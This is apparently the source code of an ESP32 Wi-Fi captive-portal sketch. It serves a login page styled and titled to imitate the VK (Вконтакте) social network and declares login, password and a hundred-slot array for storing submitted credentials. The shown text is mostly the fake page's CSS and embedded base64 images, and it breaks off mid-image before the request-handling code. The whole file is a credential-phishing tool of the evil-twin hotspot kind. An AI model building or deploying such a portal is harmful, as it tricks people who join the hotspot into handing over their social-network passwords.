#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>


const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
WebServer webServer(80);
String login;
String password;
int counter = -1;
String logpass[100];

String responseHTML = 
R"====(
<!DOCTYPE html>
<html>
 <head>
    <style>
      *{
        margin:0;
        padding:0;
      }

      body{

        background-color: #edeef0;
        width: 100%;

      }

      a{
        text-decoration: none;
        font-family: 'Roboto', sans-serif;
      }

      header{
        position: static;

        height: 41px;
        width: 100%;
        background-color: #4a76a8;
        display: flex;
      }

      .logo img{
        margin-top: 9px;
        margin-left: 470px;
      }

      header p{
        font: 12pt/10pt bold;
        color: #fefefe;
        margin-top: 15px;
        margin-left: 8px;
      }

      header form{
        margin-left: 45px;
        margin-top: 7px;
      }

      .search input[type='text']{
        background-color: #224b7a;
        border: 0px solid black;
        width: 177px;
        height: 28px;
        border-radius: 15px;
        outline:none;
      }

      .search input[type='text']:focus{
        background-color: #ffffff;
        border: 0px solid black;
        width: 177px;
        height: 28px;
        border-radius: 15px;
      }

      .search input::-moz-placeholder{
        color: #8fadc8;
        margin-left: 28px;
      }

      .search input::-webkit-input-placeholder {
        color: #8fadc8;
        margin-left: 28px;
      }

      .search input{
          padding: 0 28px;
      }

      .magnifier{
        margin-top: 14px;
        margin-left: -226px;
      }

      .magnifier img{
        width: 17px;
        height: 17px;
      }

      main{
        width: 739px;
        height: 449px;
        background-color: #ffffff;
        margin-top: 50px;
        margin-left: 10%;
        border-radius: 5px;
        border: 1px solid #e2e3e7;
      }

      .enter p{
        color: #101111;
        margin-left: 295px;
        margin-top: 41px;
        font: 15pt/12pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .condition{
        width: 677px;
        height: 55px;
        background-color: #f0f2f5;
        margin-top: 27px;
        margin-left: 31px;
        border:1px solid #ced5e1;
        border-radius: 2px;
      }

      .condition p{
        margin-top: 20px;
        margin-left: 17px;
        font: 10pt/8pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .login input[type="text"]{
        width: 244px;
        height:34px;
        margin-left: 234px;
        margin-top: 30px;
        background-color: #ffffff;
        border: 1px solid #e0e5e8;
        border-radius: 3px;
        outline:none;
      }

      .login input{
          padding: 0 12px;
      }

      .password input[type="password"]{
        width: 244px;
        height:34px;
        margin-left: 234px;
        margin-top: 14px;
        background-color: #ffffff;
        border: 1px solid #e0e5e8;
        border-radius: 3px;
        outline:none;
      }

      .password input{
          padding: 0 12px;
      }

      .checkbox input[type="checkbox"]{
        margin-top: 8px;
        margin-left: 215px;
        opacity: 0;

      }

      .checkbox{
        display: flex; 
      }

      .checkbox label{
        margin-left: 7px;
        margin-top: 17px;
        font: 10pt/8pt bold;
        font-family: 'Roboto', sans-serif;
      }

      .checkbox input+label {
        display: inline-flex;
        align-items: center;
        user-select: none;
      }
      .checkbox input+label::before {
        content: '';
        display: inline-block;
        width: 13px;
        height: 13px;
        flex-shrink: 0;
        flex-grow: 0;
        border: 1px solid #d4dadf;
        border-radius: 0.25em;
        margin-right: 0.5em;
        background-repeat: no-repeat;
        background-position: center center;
        background-size: 50% 50%;
      }

      .checkbox input:checked+label::before {
        border-color: #5181b8;
        background-color: #5181b8;
        background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3e%3cpath fill='%23fff' d='M6.564.75l-3.59 3.612-1.538-1.55L0 4.26 2.974 7.25 8 2.193z'/%3e%3c/svg%3e");
      }

      .go input{
        width: 106px;
        height: 35px;
        margin-left: 235px;
        margin-top: 20px;
        background-color: #5181b8;
        color: #fffff6;
        border: 0px solid;
        border-radius: 2px;
      }

      .go input:hover{
        background-color: #5b88bd;
        cursor: pointer;
      }

      .register{
        margin-left: 350px;
        margin-top: -35px;
      }

      .register input{
        width: 156px;
        height: 35px;
        background-color: #5fb053;
        color: #fffff6;
        border: 0px solid;
        border-radius: 2px;
      }

      .register input:hover{
        background-color: #68b35d;
        cursor: pointer;
      }

      .forgot a{
        float: left;
        margin-left: 235px;
        padding-top: 40px;
        color: #275389;
        font: 13px/8px solid;
        font-family: 'Roboto', sans-serif;
      }

      .line{
        margin-left: 471px;
        margin-top: 88px;
      }

      .more{
        display: flex;
      }

      .more a{
        color: #396595;
        position: relative;
        top: 10px;
        font: 13px/11px solid;
        font-family: 'Roboto', sans-serif;
      }

      .more a:hover{
        text-decoration: underline;
      }

      .vk{
        margin-left: 10%;
      }

      .more p{
        margin-left: 67px;
        margin-top: -3px;
        font: 14px/12px solid;
        color: #909a9b;
        font-family: 'Roboto', sans-serif;
      }

      .more2{
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around;
        margin-left: 99px;
      }

      .info{
        margin-left: 13px;
      }

      .more3{
        margin-left: 104px;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-around;
      }

      .languages{
        margin-left: 10px;
      }
    </style>
    <meta charset="utf-8">
    <title>Вход | Вконтакте</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="images/fav_logo.png">
  </head>
  <body>
    <header>
      <div class="logo">
        <a href="#"><img src="data:image/png;base64,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"></a>
      </div>
      <div class="home">
      </div>

      <div>
        <form action="" method="POST" class="search">
          <div class="search">
            <input type="text" name="name" id="name" placeholder="Поиск">
          </div>
        </form>
      </div>

      <div class="magnifier">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAfQAAAH0CAYAAADL1t+KAAAACXBIWXMAAC4jAAAuIwF4pT92AAAIh2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNi4wLWMwMDIgNzkuMTY0MzUyLCAyMDIwLzAxLzMwLTE1OjUwOjM4ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjEgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMC0wNC0yM1QxODoyNzowNyswNTowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMC0wNC0yM1QxODoyODoxOCswNTowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjAtMDQtMjNUMTg6Mjg6MTgrMDU6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmJhNjI2ZjZlLTIyNzMtMTg0Ni1iYTRkLWViMGFkZWEyNmE2MiIgeG1wTU06RG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOjljZmU5NjMyLWMyNjgtNzc0Zi1iYmIxLWJkMmM3NGY4NmU4MyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOmNiMTlhNDcxLTU2NTgtODQ0Yi05NzIzLTkxMjNiODhkYmQ4ZiIgcGhvdG9zaG9wOkNvbG9yTW9kZT0iMyI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6Y2IxOWE0NzEtNTY1OC04NDRiLTk3MjMtOTEyM2I4OGRiZDhmIiBzdEV2dDp3aGVuPSIyMDIwLTA0LTIzVDE4OjI3OjA3KzA1OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjEuMSAoV2luZG93cykiLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249InNhdmVkIiBzdEV2dDppbnN0YW5jZUlEPSJ4bXAuaWlkOmE2N2Y2ZGQwLWM1ODctZjE0Ny05MzAwLWU5YWEyYzI3MTNiMyIgc3RFdnQ6d2hlbj0iMjAyMC0wNC0yM1QxODoyODoxOCswNTowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIDIxLjEgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjb252ZXJ0ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImZyb20gYXBwbGljYXRpb24vdm5kLmFkb2JlLnBob3Rvc2hvcCB0byBpbWFnZS9wbmciLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImRlcml2ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImNvbnZlcnRlZCBmcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDpiYTYyNmY2ZS0yMjczLTE4NDYtYmE0ZC1lYjBhZGVhMjZhNjIiIHN0RXZ0OndoZW49IjIwMjAtMDQtMjNUMTg6Mjg6MTgrMDU6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCAyMS4xIChXaW5kb3dzKSIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6YTY3ZjZkZDAtYzU4Ny1mMTQ3LTkzMDAtZTlhYTJjMjcxM2IzIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOmNiMTlhNDcxLTU2NTgtODQ0Yi05NzIzLTkxMjNiODhkYmQ4ZiIgc3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOmNiMTlhNDcxLTU2NTgtODQ0Yi05NzIzLTkxMjNiODhkYmQ4ZiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PiPpnwcAADhmSURBVHic7d13uKRlff/x9wK7y9KbVKlSRaoFBZQRS0RFBSuoY8cajEZjxiQmGpPxF41GgxolBh0xiEQNGA2JigNRKYpUKVJEOtLbLsuW8/vjO0falrPnzMz3ee7n/bquuRYL8Fl2OZ/z3M99f+9ZExMTSJKkelstO4AkSZo5C12SpAJY6JIkFcBClySpABa6JEkFsNAlSSqAhS5JUgEsdEmSCmChS5JUAAtdkqQCWOiSJBXAQpckqQAWuiRJBbDQJUkqgIUuSVIBLHRJkgpgoUuSVAALXZKkAljokiQVwEKXJKkAFrokSQWw0CVJKoCFLklSASx0SZIKYKFLklQAC12SpAJY6JIkFcBClySpABa6JEkFsNAlSSqAhS5JUgEsdEmSCmChS5JUAAtdkqQCWOiSJBXAQpckqQAWuiRJBbDQJUkqgIUuSVIB1sgOMEzdXj87gupjDWAOMBdYc/CZN/hxS2BTYENgY2AjYIPBZ11gHWCtwWfyz50LrL6cv9ci4EHggcFnPnAfcC9wz+BzF3D74HMbcPPgjxcACwc/Tv7xg8DETP8BqHyddis7gsaoqEKXHmUWUbKTpbsWD5XxDsDWwFbAFoPPloMf1x78ucMye/BZexX/vDuAm4hyvxG4HrgB+C1wC/FNwX3A/TxU9EuGE1lS3VjoKsVqPFTeaxNP1ZsAmwFPBLYHtgG2G/y4vKfpKtlo8Nl9Gf/b/UTBXw1cA1wx+PweuHPwuZ9YHViCT/RS8Sx01dUaxFPvXGJZ/PHE0/buwK5EgW9HLJuXaG1gl8Fn0gTx5P5bouR/BVzOQ0/49xBP8YuApWPMKmkMLHTVxWo89L57I2BHYCdgb2AfHlo2b7JZwOaDzzOAI4j37jcTJX8BcDFw2eA/30OU+yJ8gpdqz0JXla3BQ+++d+Oh8n4y8b57o7Rk9TGPWK3YHjiYKO87iCf3XwDnAxcC1xEb9hbi07tUSxa6qmQWsYw+j1gq3xfY72GfuQx3s1oTzSb2FWwGPGvw391MlPvPBp/LeWijnZvspJqw0FUFc4in8E2AFnAgsWS8c2KmJtkcOHTwmQ+cB5wx+FxILM0vwHKXKs1CV5bJY1ybAU8DnkMU+RMyQ4m1gAMGn/cDlwCnAf9LvIO/jyh3l+WlirHQNU6rE8vpWxHvwl9AFMeOmaG0XHOJX6d9gHcQu+Z/AvSJjXV34I55qTIsdI3aLGJJfQPgScBzgRcRx63m5MXSKlobeObg837gTOC/iGX5q4h37ha7lMhC16isRjyNbw08nyjxp1LuufAmWQd4HrFr/nrgx8BJxJL8rTjIRkphoWvYVgPWJ46WvYQo8h1SE2lUVge2Bd4MHAn8EjgZ+B9iSX4JPrVLY2OhaxgmZ6ZvRByFehXwQlZ9drnqa01iU+OBwNHEE/u3gbOJ3x+L86JJzWCha6bmEsvqzwNeC+yPZ8WbbmviPfubgO8MPmcBd+PRN2lkLHRN11xi+thLieXWPXPjqII2BN5CjKD9MXACsUP+ZnzHLg2dha5VNZc4ZvZyYml9WTeBSQ+3FjG05nnAT4Ee8Z79Vix2aWgsdE3VbOKo2RFEkXt2XKtqTeLY4oHEcbevE8V+Gxa7NGMWulZmNWKX+msHn51y46gAaxJHGZ8F/B/wNeBU4PbMUFLdWehakc2BVxDvQffOjaICrUkswx8I/Aj4MvDfuHFOmhYLXcuyHnAI8Me4a12jN494x94C/h04jjjuJmkVWOh6uDnEMujRxLvOeblx1DDrAm8nyv04Yin+itREUo1Y6Jq0K/A24HXApslZ1GxbAh1i0uC/EENqbk1NJNXAatkBlG5j4Cjii+b7scxVDasBewCfIY65HYiX+Ugr5BN6c80hbs76E2LHsV8sVUVzgD8iyv0E4Bjgd6mJpIryCb2ZtgY+RpwDfjGWuaptFrAV8F7gROD1xFwESQ/jE3qzzAGeA3yYWMKU6mQ2sB8xZrgFfBa4MDOQVCU+oTfHVsBHid3DlrnqbB7wBuLd+luSs0iV4RN6+eYQwzs+CByUnEUaltWBvYhNc3sDn8Mjbmo4n9DLtgnwl8RTuWWuEk2eXf86MdVQaiyf0Mv1VKLMX4zfuKlss4GnAV8Enjz48drURFICv9CXZy7xfvE4YjCHv8ZqglnEitT7gGNxn4gayC/2ZdkS6BLvE72nXE00lxhb/E3gSDySqQax0MtxAPFk8h7ichWpqVYjTnV8ljjZsUVuHGk8LPQyvBb4CvBCHLghTdqEGEZzLF7/qwaw0OttbWJIzGeAXZKzSFU0jxgdezzwstwo0mi5y72+tgX+nHhP6BK7tHxrALsBXwC2A74MzM8MJI2CT+j1tB9xScWbsMylqViNeJf+18DHgcflxpGGz0KvnxcTd0S/mNjRK2nqNiAG0Uw+rUvFsNDr5S3EkbS9k3NIdbYW8FLgG8QAJqkIFno9rAn8KXEEZ/vkLFIJJm9u+xJwSHIWaSjcFFd9GxDTr96J7/2kYVqduIr1s8BGxBO7VFsWerVtCXwIeD2wYXIWqUSrAzsC/4+46OVLwERqImmaLPTqegLwV8QNUmsnZ5FKNouYLPdRYB3gn4GFqYmkabDQq2k34GPAobiTXRqXTYkVsXWATwH35caRVo2b4qpnD2L572VY5tK4bQIcTayOrZucRVolFnq17AF8AngRrp5IWTYE3k0swTu4SbVhoVfHk4gyfwH+ukjZ1gbeBfwdcW5dqjyfAqthd+DviUskLPMcDxDzve8DrgWuG3xuGPz4e+Dewf8+f/B5oNNuPTjVv0G311+NmCkwb/BZZ/BZH3g8sTFr68FnO+Io1TpEufj7YvzmAm8DFhOXIC3IjSOtmIWebzditvQhxBEajd4C4GaiqK8BrgIuH/zxb4nSfrDTbi0e5t+0024t5aFvBpap2+vPAuYQZfI44rTDTsDOxFChycLfiNidrdGaS8yAeBD4Gyx1VZiFnmtnYje778xH6x7gd8CvgfOBy4CrgRs67dYdibkeo9NuTRBHphYSua8C/heg2+vPBjYHdiB+7zyRGAO8IzGzwKf40Zgs9fnAJ/GmNlWUJZJnO+AjxNG02blRirOQWCr/JfAL4ByiwG/ttFu1PV/cabcW8dCrgNMBur3+BkSZ70uMMn0KsAsOIhq2dYE/Jl7NfA6f1FVBFnqOzYh3cofh0bRhuR+4CDgT+Dnwy067dU1qojHotFt3AXcBlwDHd3v9ecA+wDOAFrAXsUSvmdsYeD9R5v9CLMNLlWGhj99awAeAV+Pu2Zm6H/gN8GPgf4CLOu3WLbmRcnXarQXENzQ/7/b6XyDewR9A7NHYH+8DmKnJ4TN3At8EFuXGkR5ioY/f0cAb8HzrdC0BLiaWnH8AnNVpt+7OjVRNg3K/GLi42+v/K3Ga4rnAc4CnExvrtOq2JDay3gb8kNgFL6Wz0Mfr7Xhr2nTdDpwG/Bdweqfd+l1ynlrptFtLgAuBC7u9/heJe8APISYS7poYra62AT4DHElstFyamkYCZk1MlHOxULfXz46wIq8ihlTsmB2kZi4BTgZOAn69Kue+tXLdXn8LYv7By4GD8TXQqjoHeA1x3LFyOu1WdgSNkYU+Hs8lLnvYKztITSwGziLeUZ7cabeuT85TvMHQm4OJq3oPwVWkVfFt4L3EyYpKsdCbxSX30dsT6Ax+1IotBM4A/hX4UdXOiJdsMPTmR91e/zTiG8/XE0/t26QGq4eXANcTMyX8Pas0FvpobUbsiD0Qp3qtyHxip/pxwH932q0HkvM01qDYzwPO6/b6XwbeRJzI2DY1WLXNJv45XUscZ3PwjFJY6KP1AeClxChPPdZSYgra54HTOu2WXwgrpNNuXQZ8qNvrfw14I7EBbKvUUNW1HvBnxPjg7+FxNiWw0EfnncSy5drZQSrqLOAY4D/qPL2tCTrt1iXAn3V7/R5xA9nr8K7wZdmMuDHxOuBc3PmuMbPQR+P5xJjIzbKDVNDlxLJkz3fk9dJpty4G3tXt9U8iNoG9GC8UerSdiDPqRxH3B0hj42UOw7czsdS+S3aQirmHmIH9wk679U+WeX112q2fEEe1Xg+cnRynip4P/AmuYmjMfEIfrjnA+4Bn4jdLkyaIsaz/MCgCFWCwcfGEbq//I+Jp/a24IvVwbyfuFvgGcXpDGjlLZ7j+BHglsGZyjqq4hhh1+2rLvEydduvWTrv1l8QRt1Oy81TIPOCvifn5vpbQWFjow3MI8DbiRqamW0JMdntxp906ptNu3ZMdSKPVabd+Rnwz+x7iGznFGf4/wyN/GhMLfTi2Bj6IY10hNgK9B3hjp936dXYYjU+n3Xqw0259njiqeWp2nop4AbH8vn52EJXPQh+ODnH/dNOdDBzaabf+xTPlzdVpty4kntY/iJPTAN4BHArMzQ6islnoM/da4HCa/d78buJ94es67dZF2WGUr9Nu3ddptz5FPK3/X3aeZOsB7yeur3VipEbGQp+ZXYmNcE3e3Xsx8PpOu/WxTrt1X3YYVUun3fop8Api9kCT7UO8itowO4jKZaFP3xzgwzT70pWTgMM77db3soOoujrt1u+JQUvvAW5OjpPpjcT98y69ayQs9Ol7HbGzvYlz2hcTIy7f2mm3rsgOo+rrtFuLBxvmjgDOT46TZRax63237CAqk4U+PXsRO1ebeETt98C7O+1Wx+NoWlWddqtPLMGfnBwlyy7E8KlNsoOoPBb6qluTuKBiT5q3weUi4MhOu/Xl7CCqr067dRXwZmIU8ERynAyvAV6IS+8aMgt91b2cOILStF3tZwBHdNqtH2cHUf0NZvn/KXHks2lHHCdHRHvfg4bKQl812xOjTLfIDjJm3wXaDorRMA3eq/8/4pz2rdl5xmxvYv59E1/baUQs9FXzduIsaZN8FXhHp93yKkiNRKfd+jpRbtdlZxmzI3HWu4bIQp+6ZwGvAtbODjImi4BPAUcPjh1JI9Npt04hrmO9PDvLGG1MrE5skx1EZbDQp2Y2Melp6+wgY/Ig0AU+0mm37s0Oo2botFunA28ghhU1xQuJaXrzsoOo/iz0qXkDcBDNuD9+EfB3wEc77daC7DBqlk67dTbxpP6r7Cxj9E5i6qQ0Ixb6ym0KvIVm3Ja0EPhboNtpt5Zmh1Ezddqt84k7Ei5IjjIuOxNH2ZrwNUYjZKGv3NHAHpR/5nwJ8EngE512a1F2GDVbp926jGYtv78beHJ2CNWbhb5iewGHUf5GuMXAPwB/Z5mrKjrt1gXE6lgTNsqtDbyJWBGUpsVCX75ZxFGa7bODjMGXiDJ/IDuI9